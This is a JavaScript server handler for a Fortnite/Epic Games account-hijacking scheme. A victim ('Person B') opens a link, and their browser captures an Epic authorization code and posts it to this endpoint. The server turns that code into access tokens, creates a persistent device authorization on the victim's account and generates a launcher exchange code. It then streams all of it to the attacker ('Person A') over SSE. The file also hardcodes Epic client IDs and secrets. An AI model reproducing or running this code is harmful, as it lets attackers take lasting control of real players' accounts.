/**
 * POST /deliver?t=TOKEN
 * Body: { event: 'clicked' | 'code', code?: string }
 *
 * Called by Person B's browser (/go and /pop pages).
 * Pushes the event straight down Person A's open SSE connection.
 *
 * For the 'code' event we also kick off the full Epic chain
 * (auth code → access token → device auth → launcherAppClient2 exchange code)
 * server-side and push the enriched result back to Person A.
 */

import https from 'https';
import { getSession, deliverCode, pushToSSE } from './_state.js';

// ── Epic client credentials ───────────────────────────────────────────
const PC_ID        = 'ec684b8c687f479fadea3cb2ad83f5c6'; // fortnitePCGameClient
const PC_SECRET    = 'e1f31c211f28413186262d37a13fc84d';
const AND_ID       = '3f69e56c7649492c8cc29f1af08a8a12'; // fortniteAndroidGameClient
const AND_SECRET   = 'b51ee9cb12234f50a69efa67ef53812e';
const LAUNCH_ID    = '34a02cf8f4414e29b15921876da36f9a'; // launcherAppClient2
const LAUNCH_SEC   = 'daafbccc737745039dffe53d94fc76cf';

const PC_BASIC     = Buffer.from(`${PC_ID}:${PC_SECRET}`).toString('base64');
const AND_BASIC    = Buffer.from(`${AND_ID}:${AND_SECRET}`).toString('base64');
const LAUNCH_BASIC = Buffer.from(`${LAUNCH_ID}:${LAUNCH_SEC}`).toString('base64');

const TOKEN_URL    = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token';
const EXCHANGE_URL = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange';
const DEVICE_URL   = (id) => `https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${id}/deviceAuth`;

// ── Simple HTTPS helper (no deps) ────────────────────────────────────
function epicFetch(url, { method = 'GET', headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = https.request(
      { hostname: u.hostname, path: u.pathname + u.search, method, headers },
      (res) => {
        let data = '';
        res.on('data', d => (data += d));
        res.on('end', () => {
          try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
          catch { resolve({ status: res.statusCode, body: data }); }
        });
      }
    );
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

// ── Full Epic chain ──────────────────────────────────────────────────
async function runChain(authCode) {
  console.log('[CHAIN] starting with authCode:', authCode);

  // Step 1: auth code → PC access token
  // launcherAppClient2 returns auth codes — use it directly
  const b1 = new URLSearchParams({ grant_type: 'authorization_code', code: authCode }).toString();
  const r1 = await epicFetch(TOKEN_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': `Basic ${LAUNCH_BASIC}`,
      'Content-Length': Buffer.byteLength(b1).toString(),
    },
    body: b1,
  });
  console.log('[CHAIN] step1 status:', r1.status, JSON.stringify(r1.body).slice(0, 200));

  if (r1.status !== 200) {
    // Fallback: try with PC client
    const r1b = await epicFetch(TOKEN_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': `Basic ${PC_BASIC}`,
        'Content-Length': Buffer.byteLength(b1).toString(),
      },
      body: b1,
    });
    console.log('[CHAIN] step1 fallback status:', r1b.status);
    if (r1b.status !== 200) throw new Error(`Token exchange failed: ${JSON.stringify(r1b.body)}`);
    r1.body = r1b.body;
  }

  let { access_token, account_id, displayName } = r1.body;
  console.log('[CHAIN] step1 ✅', displayName, account_id);

  // Step 2: swap to Android token (needed for device auth creation)
  try {
    const swapR = await epicFetch(EXCHANGE_URL, {
      headers: { Authorization: `Bearer ${access_token}` },
    });
    if (swapR.status === 200 && swapR.body?.code) {
      const b2 = new URLSearchParams({ grant_type: 'exchange_code', exchange_code: swapR.body.code }).toString();
      const r2 = await epicFetch(TOKEN_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Authorization': `Basic ${AND_BASIC}`,
          'Content-Length': Buffer.byteLength(b2).toString(),
        },
        body: b2,
      });
      if (r2.status === 200 && r2.body?.access_token) {
        access_token = r2.body.access_token;
        console.log('[CHAIN] step2 ✅ Android token');
      }
    }
  } catch (e) { console.warn('[CHAIN] step2 swap non-fatal:', e.message); }

  // Step 3: create device auth
  const r3 = await epicFetch(DEVICE_URL(account_id), {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${access_token}`,
      'Content-Type': 'application/json',
      'Content-Length': '2',
    },
    body: '{}',
  });
  console.log('[CHAIN] step3 status:', r3.status);
  if (r3.status !== 200) throw new Error(`Device auth failed: ${JSON.stringify(r3.body)}`);
  const deviceId = r3.body.deviceId;
  console.log('[CHAIN] step3 ✅ deviceId:', deviceId);

  // Step 4: generate launcherAppClient2 exchange code (for Fortnite launch)
  let launchCode = null;
  try {
    const e1 = await epicFetch(EXCHANGE_URL, { headers: { Authorization: `Bearer ${access_token}` } });
    if (e1.status === 200 && e1.body?.code) {
      const lb = new URLSearchParams({ grant_type: 'exchange_code', exchange_code: e1.body.code }).toString();
      const lr = await epicFetch(TOKEN_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Authorization': `Basic ${LAUNCH_BASIC}`,
          'Content-Length': Buffer.byteLength(lb).toString(),
        },
        body: lb,
      });
      if (lr.status === 200 && lr.body?.access_token) {
        const e2 = await epicFetch(EXCHANGE_URL, { headers: { Authorization: `Bearer ${lr.body.access_token}` } });
        if (e2.status === 200 && e2.body?.code) {
          launchCode = e2.body.code;
          console.log('[CHAIN] step4 ✅ launchCode:', launchCode);
        }
      }
    }
  } catch (e) { console.warn('[CHAIN] step4 non-fatal:', e.message); }

  return { authCode, displayName, accountId: account_id, deviceId, launchCode };
}

// ── Handler ──────────────────────────────────────────────────────────
export default async function handler(req, res) {
  // CORS — /pop runs on same domain but fetch needs it
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).end();

  const token = String(req.query.t || '').trim();
  if (!token) return res.status(400).json({ ok: false, error: 'no-token' });

  const session = getSession(token);
  if (!session) {
    console.warn('[DELIVER] unknown/expired token:', token.slice(0, 8));
    return res.status(410).json({ ok: false, error: 'session-expired' });
  }

  let body;
  try { body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body; }
  catch { return res.status(400).json({ ok: false, error: 'bad-json' }); }

  const event = String(body?.event || '').trim();
  console.log(`[DELIVER] token=${token.slice(0,8)} event=${event}`);

  // ── 'clicked' — Person B opened the link ────────────────────────
  if (event === 'clicked') {
    if (session.sseRes) pushToSSE(session.sseRes, 'clicked', {});
    return res.status(200).json({ ok: true });
  }

  // ── 'code' — Person B's browser captured the auth code ──────────
  if (event === 'code') {
    const code = String(body?.code || '').trim().toLowerCase();
    if (!/^[a-f0-9]{32}$/.test(code)) {
      return res.status(400).json({ ok: false, error: 'bad-code' });
    }

    console.log(`[DELIVER] auth code received: ${code}`);

    // Respond to Person B's browser immediately — don't make them wait
    res.status(200).json({ ok: true });

    // Run the full Epic chain in background, push result to Person A via SSE
    runChain(code)
      .then(result => {
        console.log('[DELIVER] chain complete:', result.displayName, result.launchCode);
        deliverCode(token, result.authCode, result);
      })
      .catch(err => {
        console.error('[DELIVER] chain failed:', err.message);
        // Still deliver the raw auth code even if chain failed
        deliverCode(token, code, { authCode: code, error: err.message });
      });

    return; // already responded
  }

  return res.status(400).json({ ok: false, error: 'unknown-event' });
}
